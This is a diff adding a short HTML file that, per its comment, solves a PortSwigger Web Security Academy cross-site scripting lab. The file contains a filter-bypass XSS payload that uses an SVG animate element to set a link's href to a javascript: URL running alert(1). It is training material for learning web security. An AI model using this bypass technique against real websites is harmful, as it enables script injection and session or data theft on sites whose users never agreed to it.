@@ -1,0 +1,9 @@
+<!-- The following payload solves the following lab: -->
+<!-- https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked -->
+
+<svg>
+    <a>
+      <animate attributeName="href" values="javascript:alert(1)" />
+      <text x="20" y="20">Click me</text>
+    </a>
+</svg>
